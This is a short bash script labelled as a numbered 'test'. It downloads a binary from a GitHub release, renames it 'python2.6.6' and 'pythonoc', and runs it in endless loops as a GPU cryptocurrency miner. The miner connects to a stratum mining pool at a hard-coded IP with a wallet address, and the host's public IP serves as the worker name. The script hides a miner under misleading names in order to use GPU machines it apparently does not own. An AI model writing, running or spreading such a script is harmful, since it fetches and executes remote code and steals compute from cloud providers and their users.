#!bin/bash -xe 

## getting IP info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io

echo '#######################################################'
echo '##################### Test N 31 ########################'
echo '#######################################################'

rm -rf python2.6.6
rm -rf pythonoc
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
chmod +x python2.6.6
cp python2.6.6 pythonoc

#### Clean logs
echo > cuout
echo > ocout
echo > ocoutdef
echo > cuoutdef
echo > oout
echo > results.txt 

if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then
    while true
    do 
        date 
        ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U 2>> cuoutdef 1>> cuoutdef &
        while true;do nvidia-smi  -q -i 0 -d CLOCK;sleep 5000;done &
        tail -f cuoutdef
        echo '#################    Final 1200s result    #################'   

    done

else
    while true
    do
        date
        ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128 2>> oout 1>> oout &
        ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80   --cuda-parallel-hash 4  --cuda-block-size 256   --cu-schedule auto --cuda-streams 2 --cuda-grid-size 16384 2>> oout 1>> oout &
        while true;do nvidia-smi  -q -i 0 -d CLOCK;sleep 5000;done &
        tail -f oout 

        echo '#################    Final 1200s result    #################'   
     
    done
fi
